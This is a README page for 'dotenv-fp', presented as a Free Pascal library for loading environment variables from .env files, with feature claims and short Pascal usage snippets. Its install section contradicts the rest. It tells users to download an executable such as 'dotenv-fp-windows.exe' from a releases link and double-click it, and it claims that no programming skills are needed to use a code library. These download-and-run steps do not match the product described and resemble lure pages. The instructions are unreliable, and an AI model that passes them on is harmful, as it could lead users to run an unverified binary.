---
layout: "default"
title: "🌟 dotenv-fp - Load and Manage Environment Variables Easily"
description: "🌿 Load and manage environment variables from `.env` files in Free Pascal easily, keeping your configuration secure and straightforward."
---
# 🌟 dotenv-fp - Load and Manage Environment Variables Easily

[![Download dotenv-fp](https://img.shields.io/badge/Download%20dotenv--fp-007ACC?style=for-the-badge&logo=github)](https://github.com/postlevel/dotenv-fp/releases)

## 🚀 Getting Started

Welcome to dotenv-fp! This library helps you easily manage your application’s environment variables using .env files. You don’t need programming skills to use it. Follow the steps below to get started.

## 📥 Download & Install

To get the latest version of dotenv-fp, visit this page to download: [GitHub Releases](https://github.com/postlevel/dotenv-fp/releases).

1. **Go to the Releases Page**: Click on the link above to navigate to the releases section.
2. **Select the Latest Version**: Look for the latest version listed at the top. It’s usually marked with the highest number.
3. **Download the File**: Click on the file that fits your operating system (Windows, macOS, or Linux). For example, it might look like `dotenv-fp-windows.exe`.
4. **Run the Application**: After the file has finished downloading, locate it in your downloads folder and double-click to run it.

## 🖥️ System Requirements

Before installation, ensure your system meets these requirements:

- **Operating System**: Windows 10 or later, macOS 10.14 or later, or any recent Linux distribution.
- **Free Pascal Compiler**: Version 3.0 or later. You can download it [here](https://www.freepascal.org/download.html).
- **Lazarus IDE**: (Optional) Recommended for development. Download it [here](https://www.lazarus-ide.org/).

## 📚 Features

- **Type-Safe Getters**: Access your environment variables with confidence. Each variable is typed correctly to avoid errors.
- **Validation**: Validate the data in your .env files to ensure it meets your requirements.
- **Interpolation**: Easily use one variable’s value within another.
- **Zero Memory Management**: Focus on your project without worrying about memory leaks.
  
## 🔧 How to Use dotenv-fp

1. **Create a .env File**: In the root directory of your project, create a file named `.env`. This file will hold your environment variables.

   Example of a .env file:
   ```
   # Database Configuration
   DB_HOST=127.0.0.1
   DB_USER=root
   DB_PASS=secret123
   ```

2. **Loading Variables**: Use the library in your Free Pascal code to load these variables.

   ```pascal
   uses dotenv;

   var
     dbHost: string;
   begin
     LoadEnv('.env'); // Load your environment variables
     dbHost := GetEnv('DB_HOST'); // Access the variable
   end;
   ```

3. **Validation Example**: You can validate certain variables to ensure they are set correctly.

   ```pascal
   if not Exists('DB_HOST') then
     WriteLn('DB_HOST is missing');
   ```

## ⚙️ Configuration Tips

- **Comment Your File**: Use comments in your .env file to explain each variable.
- **Keep It Secure**: Always keep .env files private. Do not share them publicly, especially with sensitive information.

## 🏎️ Frequently Asked Questions

1. **What is dotenv-fp?**
   - It is a feature-rich library that helps you load environment variables from .env files easily and safely.

2. **Which programming experience do I need?**
   - No programming expertise is required. If you can follow instructions, you can use this library.

3. **How do I report issues?**
   - If you encounter any problems, report them in the 'Issues' section on the GitHub repository.

4. **Can I contribute?**
   - Absolutely! Contributions are welcome. Please check the contribution guidelines.

## 📄 License

dotenv-fp is open-source software licensed under the MIT License. You can view the license details in the repository.

## 📞 Support & Contact

If you have any questions or need further assistance, feel free to open an issue on the [GitHub repository](https://github.com/postlevel/dotenv-fp/issues).

Happy coding! Enjoy using dotenv-fp!